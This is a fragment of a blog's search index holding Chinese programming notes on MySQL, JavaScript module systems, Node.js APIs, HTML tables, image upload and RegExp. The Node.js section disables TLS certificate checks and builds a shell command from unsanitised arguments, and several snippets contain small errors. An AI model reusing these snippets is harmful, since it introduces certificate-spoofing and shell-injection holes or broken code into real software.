‘2008’ time 时间 ‘12:25:36’ datetime 日期时间 ‘2008-12-2 22:06:44’ timestamp 自动存储记录修改时间 关键字 含义 NULL 数据列可包含NULL值 NOT NULL 数据列不允许包含NULL值 DEFAULT 默认值 PRIMARY KEY 主键 AUTO_INCREMENT 自动递增，适用于整数类型 UNSIGNED 无符号 CHARACTER SET name 指定一个字符集]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>node</tag>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[module]]></title>
    <url>%2Fmodule%2F</url>
    <content type="text"><![CDATA[之前node笔记中有提到关于模块的概念，在此总结一下AMD、CMD、CommonJS和es6模块。 AMD和CMD概念之前的JavaScript没有模块这一功能，后来出现了CMD和AMD这两种方式。 AMD（Asynchronous Module Definition）是 RequireJS 在推广过程中对模块定义的规范化产出。提前执行，推崇依赖前置CMD（Common Module Definition）在推广过程中对模块定义的规范化体现是 SeaJS。延迟执行，推崇依赖就近 AMD的基本用法1234567define(id?, dependencies?, factory);//模块的名字?,所依赖模块的数组?执行的函数或对象define(['./a,./b'],function(a,b)&#123; a.doSomething(); b.doSomething();&#125;) CMD的基本用法1234567891011121314151617181920212223242526272829define(id?, dependencies?, factory);//模块的名字?,所依赖模块的数组?执行的函数或对象,不推荐带id和dependenciesdefine(function(require,exports,module)&#123; var a = require("./a"); a.doSomething(); var b = require("./b") b.doSomething();&#125;)// exports 是 module.exports 的引用，对外返回接口，可以通过以下方式define(function(require,exports,module)&#123; exports.foo = 'exports prop'; exports.doSomething = function() &#123;//export function&#125;;&#125;)// 等于 return &#123;&#125;define(function(require,exports,module)&#123; return &#123; foo: 'exports prop', doSomething: function() &#123;//export function&#125; &#125;;&#125;)// 等于 module.exportsdefine(function(require,exports,module)&#123; module.exports = &#123; foo: 'exports prop', doSomething: function() &#123;//export function&#125; &#125;;&#125;) CommonJS和es6模块AMD和CMD都属于浏览器端模块开发的规范。CommonJS 是服务端的规范，Node.js 采用了这个规范。 CommonJS 模块输出的是一个值的拷贝，ES6 模块输出的是值的引用。 CommonJS 模块是运行时加载，ES6 模块是编译时输出接口。 CommonJS123456789101112131415161718// a.jsvar name = 'a.js';var fn = function ()&#123; return console.log('this file is a.js');&#125;module.exports = &#123; name: name, method: fn&#125;// index.jsvar &#123;name,method&#125; = require('./a');method();//a.jsconsole.log(name);//this file is a.js//等于var file = require('./a');file.method();//a.jsconsole.log(file.name);//this file is a.js es6模块123456789// a.jsconst name = 'a.js';let fn = () =&gt;&#123; console.log('this file is a.js') &#125;export &#123;name,fn as method&#125;// index.jsimport &#123; name,method &#125; from './a';method();//a.jsconsole.log(name);//this file is a.js 参考链接https://github.com/seajs/seajs/issues/242https://github.com/amdjs/amdjs-api/wiki/AMDhttp://es6.ruanyifeng.com/#docs/module]]></content>
      <categories>
        <category>js</category>
      </categories>
      <tags>
        <tag>es6</tag>
        <tag>node</tag>
        <tag>module</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[node笔记]]></title>
    <url>%2Fnode%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[JS是脚本语言，脚本语言都需要一个解析器才能运行。对于写在HTML页面里的JS，浏览器充当了解析器的角色。而对于需要独立运行的JS，NodeJS就是一个解析器。每一种解析器都是一个运行环境，其内部提供的方法也不同。 安装使用官网下载安装node，支持交互式命令模式。在终端通过$ node即可。常用来测试正则。nodeJs使用CommonJS规范。 模块使用方式require:用于在当前模块中加载和使用别的模块，传入一个模块名，返回一个模块导出对象。 123const foo = require('./foo'); //相对引入，后缀js可以省略（绝对引入类似）const data = require('./data.json'); //可引入静态jsonconst path = require('path'); //内置模块path exports:当前模块的导出对象，用于导出模块公有方法和属性。 123exports.hello = function () &#123; console.log('Hello World!');&#125;; module:可以访问到当前模块的一些相关信息，但最多的用途是替换当前模块的导出对象。 123module.exports = function () &#123; console.log('Hello World!');&#125;; 模块解析规则内置模块nodeJs内置模块，传递内置模块名称，不做路径解析，例如require(&#39;path&#39;) node_modules目录node_modules目录用于nodeJs存放模块,例如引入require(&#39;foo/bar&#39;)。解析如下： 123/home/user/node_modules/foo/bar/home/node_modules/foo/bar/node_modules/foo/bar NODE_PATH环境变量nodeJs允许指定NODE_PATH，环境变量中包含一到多个目录路径，路径之间在Linux下使用:分隔，在Windows下使用;分隔。设置NODE_PATH=/home/user/lib:/home/lib，解析如下： 12/home/user/lib/foo/bar/home/lib/foo/bar npm常用包管理，nodeJs自带。下载三方包使用： 123456789101112131415npm install &lt;packages&gt;;npm install &lt;packages&gt;;@&lt;version&gt;; //指定版本npm install &lt;packages&gt;; -g //全局安装npm install &lt;packages&gt;; -S //--save:Package will appear in your dependencies.npm install &lt;packages&gt;; -D //--save-dev: Package will appear in your devDependencies.npm install &lt;packages&gt;; -O //--save-optional: Package will appear in your optionalDependencies.npm help &lt;command&gt;; //查看帮助npm ls //列出当前/node_modules/ 目录下的包npm init //初始化npm update &lt;packages&gt; //更新指定安装包npm uninstall &lt;packages&gt; //卸载指定安装包npm search &lt;packages&gt; //搜索指定安装包npm install -g cnpm --registry=https://registry.npm.taobao.org //淘宝镜像cnpm 文件操作文件操作示例node内置模块，详细api见http://nodejs.cn/api/fs.html。 nodeJs只提供基础操作API。实现小文件拷贝如下： 12345678910var fs = require('fs'); //内置fs模块function copy(src, dst) &#123; // fs.readFileSync从源路径读取;fs.writeFileSync将文件内容写入目标路径 fs.writeFileSync(dst, fs.readFileSync(src));&#125;function main(argv) &#123; copy(argv[0], argv[1]);&#125;main(process.argv.slice(2));//process是一个全局变量，可通过process.argv获得命令行参数。由于argv[0]固定等于NodeJS执行程序的绝对路径，argv[1]固定等于主模块的绝对路径，因此第一个命令行参数从argv[2]这个位置开始。 上述方法在一次读取过多到内存中时，会出现内存爆满的问题。大文件拷贝如下： 123456789var fs = require('fs');function copy(src, dst) &#123; //fs.createReadStream创建源文件的只读数据流;fs.createWriteStream创建目标文件的只写数据流 fs.createReadStream(src).pipe(fs.createWriteStream(dst));&#125;function main(argv) &#123; copy(argv[0], argv[1]);&#125;main(process.argv.slice(2)); 文件操作API 点击标题可跳转node中文网相关API。 Buffer（数据块）全局构造函数Buffer扩展JS二进制数据类型。Buffer不同于字符串只读，它可以通过[index]的方式修改。slice类似与指针，修改会改变原Buffer。交互式命令模式下运行如下： 1234567891011121314151617var bin = new Buffer([ 0x68, 0x65, 0x6c, 0x6c, 0x6f ]); //构造Buffervar bin1 = new Buffer('hello', 'utf-8'); //&lt;Buffer 68 65 6c 6c 6f&gt;bin.length; //5bin[0]; // 104 默认10进制bin[0].toString(16); //0x68 转换十六进制bin.toString('utf-8') //'hello'var sub = bin.slice(2);sub //&lt;Buffer 6c 6c 6f&gt;sub[0] = 0x65;bin //&lt;Buffer 68 65 65 6c 6f&gt;// 复制新的Buffervar dup = new Buffer(bin.length);bin.copy(dup);dup[0] = 0x48;console.log(bin); // =&gt; &lt;Buffer 68 65 6c 6c 6f&gt;console.log(dup); // =&gt; &lt;Buffer 48 65 65 6c 6f&gt; Stream（数据流）NodeJS中通过各种Stream来提供对数据流的操作。所有的流都是 EventEmitter 的实例。大文件拷贝如下： 123456789101112131415161718192021222324252627282930313233343536//处理数据前暂停数据读取，并在处理数据后继续读取数据var rs = fs.createReadStream(src);rs.on('data', function (chunk) &#123; rs.pause(); doSomething(chunk, function () &#123; rs.resume(); &#125;);&#125;);rs.on('end', function () &#123; cleanUp();&#125;);//只写数据流，可能存在读取速度大于写入速度的问题var rs = fs.createReadStream(src);var ws = fs.createWriteStream(dst);rs.on('data', function (chunk) &#123; ws.write(chunk);&#125;);rs.on('end', function () &#123; ws.end();&#125;);//改造.数据从只读数据流到只写数据流的搬运，并包括了防爆仓控制。nodeJs提供的.pipe实现也是类似机制。var rs = fs.createReadStream(src);var ws = fs.createWriteStream(dst);rs.on('data', function (chunk) &#123; if (ws.write(chunk) === false) &#123; rs.pause(); &#125;&#125;);rs.on('end', function () &#123; ws.end();&#125;);ws.on('drain', function () &#123; rs.resume();&#125;); File System（文件系统）NodeJS通过fs内置模块提供对文件的操作。大致分三类： 文件属性读写。常用fs.stat、fs.chmod、fs.chown等等。 文件内容读写。常用的有fs.readFile、fs.readdir、fs.writeFile、fs.mkdir等等。 底层文件操作。常用的有fs.open、fs.read、fs.write、fs.close等等。 异步回调，同步API比异步尾部多Sync。 Path（路径）NodeJS提供了path内置模块来简化路径相关操作，并提升代码可读性。常用的几个如下： path.normalize将传入的路径转换为标准路径。 1234567var cache = &#123;&#125;;function store(key, value) &#123; cache[path.normalize(key)] = value;&#125;store('foo/bar', 1);store('foo//baz//../bar', 2);console.log(cache); // =&gt; &#123; "foo/bar": 2 &#125; path.join将传入的多个路径拼接为标准路径。 1path.join('foo/', 'baz/', '../bar'); // =&gt; "foo/bar" path.extname根据不同文件扩展名做不同操作时。 1path.extname('foo/bar.js'); // =&gt; ".js" 遍历递归算法12345678//代码简洁，重复掉用函数自身，消耗性能。function factorial(n)&#123; if(n === 1)&#123; return 1; &#125; else &#123; return n * factorial(n - 1); &#125;&#125; 遍历算法深度优先(优先子节点)+先序遍历算法(成功就返回结果，中断循环)。遍历顺序是A &gt; B &gt; D &gt; E &gt; C &gt; F。 12345 A / \ B C / \ \D E F 同步遍历123456789101112131415161718function travel(dir, callback) &#123; fs.readdirSync(dir).forEach(function (file) &#123; var pathname = path.join(dir, file); if (fs.statSync(pathname).isDirectory()) &#123; travel(pathname, callback); &#125; else &#123; callback(pathname); &#125; &#125;);&#125;travel('/', function (pathname) &#123; console.log(pathname);&#125;);------------------------/home/user/foo/x.js/home/user/bar/y.js/home/user/z.css 异步遍历1234567891011121314151617181920212223function travel(dir, callback, finish) &#123; fs.readdir(dir, function (err, files) &#123; (function next(i) &#123; if (i &lt; files.length) &#123; var pathname = path.join(dir, files[i]); fs.stat(pathname, function (err, stats) &#123; if (stats.isDirectory()) &#123; travel(pathname, callback, function () &#123; next(i + 1); &#125;); &#125; else &#123; callback(pathname, function () &#123; next(i + 1); &#125;); &#125; &#125;); &#125; else &#123; finish &amp;&amp; finish(); &#125; &#125;(0)); &#125;);&#125; 文本编码NodeJS编写前端工具时。常用的文本编码有UTF8和GBK两种，但UTF8文件还可能带有BOM。BOM(Byte Order Marker)用于标记一个文本文件使用Unicode编码，其本身是一个Unicode字符（”\uFEFF”），位于文本文件头部。在不同的Unicode编码下，BOM字符对应的二进制字节如下： Bytes Encoding FE FE UTF16BE FE FE UTF16LE EF BB BF UTF8 Linux系统使用的 UTF32;UTF16-LE和UTF16-BE，与计算机的CPU构架有关，常用*86系统，通常为UTF16LE(Little Endian);一个中文字符需要3个字节才能表示。 使用nodeJs读取文件需要去掉BOM，如下： 123456789function readText(pathname) &#123; var bin = fs.readFileSync(pathname); if (bin[0] === 0xEF &amp;&amp; bin[1] === 0xBB &amp;&amp; bin[2] === 0xBF) &#123; bin = bin.slice(3); &#125; return bin.toString('utf-8');&#125; 使用iconv-lite第三方包转换nodeJs不支持的GBK为UTF8，如下： 1234567var iconv = require('iconv-lite');function readGBKText(pathname) &#123; var bin = fs.readFileSync(pathname); return iconv.decode(bin, 'gbk');&#125; NodeJS中自带了一种binary编码可以用来实现单字节编码,用来处理未知文本编码的情况 12345function replace(pathname) &#123; var str = fs.readFileSync(pathname, 'binary'); str = str.replace('foo', 'bar'); fs.writeFileSync(pathname, str, 'binary');&#125; 网络操作简单示例123456var http = require('http');http.createServer(function (request, response) &#123; response.writeHead(200, &#123; 'Content-Type': 'text-plain' &#125;); response.end('Hello World\n');&#125;).listen(8124); linux系统下，监听1024以下端口需要root权限 网络操作APIhttp（HTTP）http模块提供两种使用方式： 作为服务端使用时，创建一个HTTP服务器，监听HTTP客户端请求并返回响应。 作为客户端使用时，发起一个HTTP客户端请求，获取服务端响应。 服务端请求： 123456789//请求内容POST / HTTP/1.1User-Agent: curl/7.26.0Host: localhostAccept: */*Content-Length: 11Content-Type: application/x-www-form-urlencoded Hello World 1234567891011121314151617http.createServer(function (request, response) &#123; var body = []; console.log(request.method); // POST console.log(request.headers); //&#123; 'user-agent': 'curl/7.26.0',host: 'localhost',accept: '*/*','content-length': '11','content-type': 'application/x-www-form-urlencoded'&#125; request.on('data', function (chunk) &#123; body.push(chunk); &#125;); request.on('end', function () &#123; body = Buffer.concat(body); console.log(body.toString()); // Hello world &#125;);&#125;).listen(80); 服务端响应： 12345678//响应内容HTTP/1.1 200 OKContent-Type: text/plainContent-Length: 11Date: Tue, 05 Nov 2013 05:31:38 GMTConnection: keep-aliveHello World 1234567891011http.createServer(function (request, response) &#123; response.writeHead(200, &#123; 'Content-Type': 'text/plain' &#125;); request.on('data', function (chunk) &#123; response.write(chunk); &#125;); request.on('end', function () &#123; response.end(); &#125;);&#125;).listen(80) 客户端请求： 12345678910111213141516var options = &#123; hostname: 'www.example.com', port: 80, path: '/upload', method: 'POST', headers: &#123; 'Content-Type': 'application/x-www-form-urlencoded' &#125; &#125;;var request = http.request(options, function (response) &#123;&#125;);request.write('Hello World');request.end();//get存在快捷APIhttp.get('http://www.example.com/', function (response) &#123;&#125;); 12345678910111213141516171819202122232425http.get('http://www.example.com/', function (response) &#123; var body = []; console.log(response.statusCode); console.log(response.headers); response.on('data', function (chunk) &#123; body.push(chunk); &#125;); response.on('end', function () &#123; body = Buffer.concat(body); console.log(body.toString()); &#125;);&#125;);------------------------------------200&#123; 'content-type': 'text/html', server: 'Apache', 'content-length': '801', date: 'Tue, 05 Nov 2013 06:08:41 GMT', connection: 'keep-alive' &#125;&lt;!DOCTYPE html&gt;... https（HTTPS）https和http类似，区别在于https模块需要额外处理SSL证书。 服务端创建服务： 1234567891011121314151617181920//比http多一个option对象，通过key和cert字段指定了HTTPS服务器使用的私钥和公钥。var options = &#123; key: fs.readFileSync('./ssl/default.key'), cert: fs.readFileSync('./ssl/default.cer') &#125;;var server = https.createServer(options, function (request, response) &#123; // ... &#125;);//NodeJS支持SNI技术，可以根据HTTPS客户端请求使用的域名动态使用不同的证书，因此同一个HTTPS服务器可以使用多个域名提供服务。server.addContext('foo.com', &#123; key: fs.readFileSync('./ssl/foo.com.key'), cert: fs.readFileSync('./ssl/foo.com.cer')&#125;);server.addContext('bar.com', &#123; key: fs.readFileSync('./ssl/bar.com.key'), cert: fs.readFileSync('./ssl/bar.com.cer')&#125;); 客户端与http无区别，但如果目标服务器自制SSL，并非颁发机构购买的，默认情况下https模块会拒绝连接，提示说有证书安全问题。可禁用检查，满足开发环境自制SSL证书。 12345678910var options = &#123; hostname: 'www.example.com', port: 443, path: '/', method: 'GET', rejectUnauthorized: false //禁用SSL证书有效性检查 &#125;;var request = https.request(options, function (response) &#123;&#125;);request.end(); URL（网址）123456789 href ----------------------------------------------------------------- host path --------------- ---------------------------- http: // user:pass @ host.com : 8080 /p/a/t/h ?query=string #hash ----- --------- -------- ---- -------- ------------- -----protocol auth hostname port pathname search hash ------------ query 1234567891011121314151617181920212223242526272829303132// url.parse可以将URL字符串解析为URL对象url.parse('http://user:pass@host.com:8080/p/a/t/h?query=string#hash');/* =&gt;&#123; protocol: 'http:', auth: 'user:pass', host: 'host.com:8080', port: '8080', hostname: 'host.com', hash: '#hash', search: '?query=string', query: 'query=string', pathname: '/p/a/t/h', path: '/p/a/t/h?query=string', href: 'http://user:pass@host.com:8080/p/a/t/h?query=string#hash' &#125;*///url.format可以将URL对象转换URL字符串url.format(&#123; protocol: 'http:', host: 'www.example.com', pathname: '/p/a/t/h', search: 'query=string'&#125;);/* =&gt;'http://www.example.com/p/a/t/h?query=string'*///url.resolve方法可以用于拼接URLurl.resolve('http://www.example.com/foo/bar', '../baz');/* =&gt;http://www.example.com/baz*/ Query String（查询字符串）querystring模块用于实现URL参数字符串与参数对象的互相转换 123456789querystring.parse('foo=bar&amp;baz=qux&amp;baz=quux&amp;corge');/* =&gt;&#123; foo: 'bar', baz: ['qux', 'quux'], corge: '' &#125;*/querystring.stringify(&#123; foo: 'bar', baz: ['qux', 'quux'], corge: '' &#125;);/* =&gt;'foo=bar&amp;baz=qux&amp;baz=quux&amp;corge='*/ Zlib（压缩）123456789101112131415161718192021222324//判断了客户端是否支持gzip，并在支持的情况下使用zlib模块返回gzip之后的响应体数据http.createServer(function (request, response) &#123; var i = 1024, data = ''; while (i--) &#123; data += '.'; &#125; if ((request.headers['accept-encoding'] || '').indexOf('gzip') !== -1) &#123; zlib.gzip(data, function (err, data) &#123; response.writeHead(200, &#123; 'Content-Type': 'text/plain', 'Content-Encoding': 'gzip' &#125;); response.end(data); &#125;); &#125; else &#123; response.writeHead(200, &#123; 'Content-Type': 'text/plain' &#125;); response.end(data); &#125;&#125;).listen(80); 1234567891011121314151617181920212223242526272829var options = &#123; hostname: 'www.example.com', port: 80, path: '/', method: 'GET', headers: &#123; 'Accept-Encoding': 'gzip, deflate' &#125; &#125;;http.request(options, function (response) &#123; var body = []; response.on('data', function (chunk) &#123; body.push(chunk); &#125;); response.on('end', function () &#123; body = Buffer.concat(body); if (response.headers['content-encoding'] === 'gzip') &#123; zlib.gunzip(body, function (err, data) &#123; console.log(data.toString()); &#125;); &#125; else &#123; console.log(data.toString()); &#125; &#125;);&#125;).end(); Net（网络）net模块可用于创建Socket服务器或Socket客户端。 进程管理进程管理示例通过终端命令简化文件复制功能： 1234567891011var child_process = require('child_process');var util = require('util');function copy(source, target, callback) &#123; child_process.exec( util.format('cp -r %s/* %s', source, target), callback);&#125;copy('a', 'b', function (err) &#123; // ...&#125;); 进程管理APIProcess在NodeJS中，可以通过process对象感知和控制NodeJS自身进程的方方面面。process是一个全局对象，在任何地方都可以直接使用。 Child Process使用child_process模块可以创建和控制子进程。该模块提供的API中最核心的是.spawn，其余API都是针对特定使用场景对它的进一步封装，算是一种语法糖。 Clustercluster模块是对child_process模块的进一步封装，专用于解决单进程NodeJS Web服务器无法充分利用多核CPU的问题。 参考链接https://github.com/nqdeng/7-days-nodejs]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>node</tag>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[常用对照表]]></title>
    <url>%2F%E5%B8%B8%E7%94%A8%E5%AF%B9%E7%85%A7%E8%A1%A8%2F</url>
    <content type="text"><![CDATA[常用的对照表，目前包含html转义字符、http状态码。 HTML特殊转义字符对照表 字符 十进制 转义字符 “ &amp;#34; &amp;quot; &amp; &amp;#38; &amp;amp; &lt; &amp;#60; &amp;lt; &gt; &amp;#62; &amp;gt; 空格 &amp;#160; &amp;nbsp; More info HTML转义表 HTTP状态码对照表 状态码 含义 1** 信息，服务器收到请求，需要请求者继续执行操作 2** 成功，操作被成功接收并处理 3** 重定向，需要进一步的操作以完成请求 4** 客户端错误，请求包含语法错误或无法完成请求 5** 服务器错误，服务器在处理请求的过程中发生了错误 More info 状态码详表]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>html</tag>
        <tag>统计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[input[type=file]]]></title>
    <url>%2Finput%5Btype%3Dfile%5D%2F</url>
    <content type="text"><![CDATA[当使用input[type=file]上传图片功能时，通常有些问题。简要记录。 html5上传类型123456&lt;!-- html5上传 --&gt;&lt;input type="file" accept="video/*;capture=camcorder"&gt;&lt;input type="file" accept="audio/*;capture=microphone"&gt;&lt;input type="file" accept="image/*;capture=camera"&gt;&lt;!-- 直接调用相机（测试安卓可以，iphone还是有相册） --&gt;&lt;input type="file" accept="image/*" /&gt;&lt;!-- 调用相机 图片或者相册 --&gt;&lt;input type="file" multiple accept="image/*" /&gt;&lt;!-- 调用相册 --&gt; 获取方式window.URL || window.webkitURLWindow.URL 属性返回一个对象，它提供了用于创建和管理对象URLs的静态方法。它也可以作为一个构造函数被调用来构造 URL 对象。 该方法存目前属于实验特性，存在兼容性如下所示： 1&lt;input type="file" onchange="changeImg(this)"&gt; 123456789changeImg(file)&#123; let url = window.URL || window.webkitURL; console.log(url.createObjectURL(file.files[0]));//files是一个选中的数组 let img = new Image();//创建Image对象 img.src = url.createObjectURL(file.files[0]);//创建Image的对象的url img.onload = function () &#123; console.log('height:'+this.height+'----width:'+this.width) &#125;&#125; HTML5中的FileReader1&lt;input type="file" onchange="checkImg(this)"&gt; 1234567891011121314151617181920checkImg(file)&#123; let reader = new FileReader(); reader.readAsDataURL(file.files[0]);//将文件base64编码 reader.onload = function(e)&#123; let img = new Image(); let filesize = file.files[0].size/1024;//转化bit ==&gt; KB img.src = e.target.result;//获取编码后的值,也可以用this.result获取 img.onload = function () &#123; let height = this.height; let width = this.width; if(width!=80 &amp;&amp; height!=80)&#123; console.log('请上传80*80像素的图片'); &#125;else if(filesize&gt;100)&#123; console.log('请上传最大不超过100K的图片!'); &#125;else&#123; console.log('符合要求！'); &#125; &#125; &#125;&#125; 简单封装jquery库实现jquery+html5+canvas实现图片、预览、压缩、上传。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125(function($)&#123; $.fn.extend(&#123; aiiUpload:function(obj) &#123; if(typeof obj !="object") &#123; alert('参数错误'); return; &#125; var imageWidth,imageHeight; var base64; var file_num=0; var fileInput=$(this); var fileInputId=fileInput.attr('id'); createDoc('#'+fileInputId,obj.method,obj.action); $('#aii_file').change(function()&#123; if(test(this.value)==false) &#123; alert('格式错误'); return; &#125; var objUrl = getObjectURL(this.files[0]); if (objUrl) &#123; imgBefore(objUrl,file_num); render(objUrl,obj.max_h,obj.max_w,file_num); file_num++; &#125; &#125;); &#125; &#125;); function createDoc(objID,form_method,form_action) &#123; var element=$(objID); element.append('&lt;ul class="viewList"&gt;&lt;/ul&gt;').append('&lt;div class="fileBox"&gt;&lt;input type="file" id="aii_file" /&gt;&lt;div class="file_bg"&gt;&lt;/div&gt;&lt;/div&gt;').append('&lt;form id="aii_upload_form" method="'+form_method+'" action="'+form_action+'"&gt;&lt;/form&gt;').append('&lt;canvas id="canvas"&gt;&lt;/canvas&gt;'); &#125; function test(value) &#123; var regexp=new RegExp("(.JPEG|.jpeg|.JPG|.jpg|.GIF|.gif|.BMP|.bmp|.PNG|.png)$",'g'); return regexp.test(value); &#125; function render(src,MaximgW,MaximgH,idnum) &#123; var image=new Image(); image.onload=function() &#123; var canvas=document.getElementById('canvas'); if(image.width&gt;image.height) &#123; imageWidth=MaximgW; imageHeight=MaximgH*(image.height/image.width); &#125; else if(image.width&lt;image.height) &#123; imageHeight=MaximgH; imageWidth=MaximgW*(image.width/image.height); &#125; else &#123; imageWidth=MaximgW; imageHeight=MaximgH; &#125; canvas.width=imageWidth; canvas.height=imageHeight; var con=canvas.getContext('2d'); con.clearRect(0,0,canvas.width,canvas.height); con.drawImage(image,0,0,imageWidth,imageHeight); base64=canvas.toDataURL('image/jpeg',0.5).substr(22); add_doc(base64,idnum); &#125; image.src=src; &#125;; //建立一個可存取到該file的url function getObjectURL(file) &#123; var url = null ; if (window.createObjectURL!=undefined) &#123; // basic url = window.createObjectURL(file) ; &#125; else if (window.URL!=undefined) &#123; // mozilla(firefox) url = window.URL.createObjectURL(file) ; &#125; else if (window.webkitURL!=undefined) &#123; // webkit or chrome url = window.webkitURL.createObjectURL(file) ; &#125; return url; &#125; //预览 function imgBefore(objUrl,idnum) &#123; var li='&lt;li class="view"&gt;&lt;img src="'+objUrl+'" id="aiiImg_'+idnum+'" idnum="'+idnum+'" /&gt;&lt;div class="close" onclick="img_remove(this);"&gt;&lt;/div&gt;&lt;/li&gt;' $('.viewList').append(li); var img=$('#aiiImg_'+idnum); //预览图片居中 填满 代码 console.log('asdfasdfasdf'); img.load(function()&#123; var imgw=img.width(), imgh=img.height(); console.log(imgw); console.log(imgh); if(imgw&gt;imgh) &#123; img.css('height','100%'); img.css('width','auto'); img.css('marginLeft',-(img.width()-img.height())/2+'px'); &#125; else if(imgw&lt;imgh) &#123; img.css('width','100%'); img.css('height','auto'); img.css('marginTop',-(img.height()-img.width())/2+'px'); &#125; &#125;); &#125; function add_doc (base,idnum) &#123; $('#aii_upload_form').append('&lt;input type="hidden" name="img[]" id="f_'+idnum+'" value="'+base+'"/&gt;'); &#125;&#125;)(jQuery);function img_remove(element)&#123; var num=$(element).prev().attr('idnum'); $(element).parent().remove(); $('#f_'+num).remove(); console.log('asdf');&#125; 1234&lt;section class="section"&gt; &lt;div id="box"&gt;&lt;/div&gt; &lt;p style="color:red;"&gt;*样式修改请参考aiiUpload.css&lt;/p&gt;&lt;/section&gt; 1234567891011&lt;!-- 掉用方式 --&gt;&lt;script type="text/javascript"&gt; $('#box').aiiUpload(&#123; method:'POST', action:'form.php', max_h:300, max_w:300, subText:'上传图片', fileText:'选择图片' &#125;);&lt;/script&gt; 参考链接https://segmentfault.com/a/1190000002535673]]></content>
      <categories>
        <category>html</category>
      </categories>
      <tags>
        <tag>js</tag>
        <tag>html5</tag>
        <tag>上传</tag>
        <tag>文件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[正则概要]]></title>
    <url>%2F%E6%AD%A3%E5%88%99%E6%A6%82%E8%A6%81%2F</url>
    <content type="text"><![CDATA[简要说明RegExp对象，参照MDN文档,便于查找。 简介正则表达式是用于匹配字符串中字符组合的模式。在 JavaScript中，正则表达式也是对象。这些模式被用于 RegExp 的exec和test方法, 以及 String 的 match、replace、search 和split 方法。 ES6规定了String对象的正则方法通过调用RegExp的实例方法实现，从而做到所有与正则相关的方法，全都定义在RegExp对象上。 创建123456/pattern/flags //字面量new RegExp(pattern [, flags]) //构造函数/ab+c/i;new RegExp('ab+c', 'i');new RegExp(/ab+c/, 'i'); pattern:正则表达式文本 flags:指定标志 g:全局匹配;找到所有匹配，而不是在第一个匹配后停止 i:忽略大小写 m:多行;匹配每行开头结尾 u:Unicode; 将模式视为Unicode序列点的序列,处理四个字节的 UTF-16 编码 y:粘性匹配; 仅匹配目标字符串中此正则表达式的lastIndex属性指示的索引 u 修饰符123456789101112131415161718192021222324var s = '𠮷';//点字符/^.$/.test(s) // false/^.$/u.test(s) // true//Unicode 字符表示法/\u&#123;61&#125;/.test('a') // false/\u&#123;61&#125;/u.test('a') // true/\u&#123;20BB7&#125;/u.test('𠮷') // true//量词/a&#123;2&#125;/.test('aa') // true/a&#123;2&#125;/u.test('aa') // true/𠮷&#123;2&#125;/.test('𠮷𠮷') // false/𠮷&#123;2&#125;/u.test('𠮷𠮷') // true//预定义模式/^\S$/.test('𠮷') // false/^\S$/u.test('𠮷') // true//i 修饰符/[a-z]/i.test('\u212A') // false/[a-z]/iu.test('\u212A') // true y 修饰符123456789var s = 'aaa_aa_a';var r1 = /a+/g;var r2 = /a+/y;r1.exec(s) // ["aaa"]r2.exec(s) // ["aaa"]r1.exec(s) // ["aa"]r2.exec(s) // null 属性RegExp.prototype.constructor：创建该正则对象的构造函数。 RegExp.prototype.global：是否开启全局匹配，也就是匹配目标字符串中所有可能的匹配项，而不是只进行第一次匹配。 RegExp.prototype.ignoreCase：在匹配字符串时是否要忽略字符的大小写。 RegExp.prototype.lastIndex：下次匹配开始的字符串索引位置。 RegExp.prototype.multiline：是否开启多行模式匹配（影响 ^ 和 $ 的行为）。 RegExp.prototype.source：正则对象的源模式文本。 RegExp.prototype.sticky：是否开启粘滞匹配。 方法RegExp.prototype.exec()：在目标字符串中执行一次正则匹配操作。 1234var re = /quick\s(brown).+?(jumps)/ig;var result = re.exec('The Quick Brown Fox Jumps Over The Lazy Dog');//["Quick Brown Fox Jumps", "Brown", "Jumps", index: 4, input: "The Quick Brown Fox Jumps Over The Lazy Dog"]//[匹配的全部字符串,分组捕获[1],分组捕获[2],匹配到的字符位于原始字符串的基于0的索引值,原始字符串] RegExp.prototype.test()：测试当前正则是否能匹配目标字符串。 RegExp.prototype.toSource()：返回一个字符串，其值为该正则对象的字面量形式。覆盖了Object.prototype.toSource 方法. RegExp.prototype.toString()：返回一个字符串，其值为该正则对象的字面量形式。覆盖了Object.prototype.toString() 方法。 RegExp.prototype[@@match]()：返回一个数组，它包括整个匹配结果，和通过捕获组匹配到的结果，如果没有匹配到则返回null. RegExp.prototype[@@replace]():用替换器替换相应匹配项后的新字符串。 RegExp.prototype[@@search]():执行了一个在给定字符串中的一个搜索以取得匹配正则模式的项。 RegExp.prototype[@@split]():切割 String 对象为一个其子字符串的数组。 More Info exec和match exec它的参数是字符串,match参数是正则. 1234var re=new RegExp(//d/);re.exec( "abcd" );"abcd".match(/d); exec和match返回的都是数组。exec只会返回第一个满足条件的字符，match没有全局匹配(g)时，返回结果同exec。 1234567var str = 'abcda';/a/.exec(str);//["a", index: 0, input: "abcda"]str.match(/a/);//["a", index: 0, input: "abcda"]/a/g.exec(str);//["a", index: 0, input: "abcda"]str.match(/a/g);//["a", "a"]]]></content>
      <categories>
        <category>js</category>
      </categories>
      <tags>
        <tag>es6</tag>
        <tag>RegExp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[es6入门笔记-对象]]></title>
    <url>%2Fes6%E5%85%A5%E9%97%A8%E7%AC%94%E8%AE%B0-%E5%AF%B9%E8%B1%A1%2F</url>
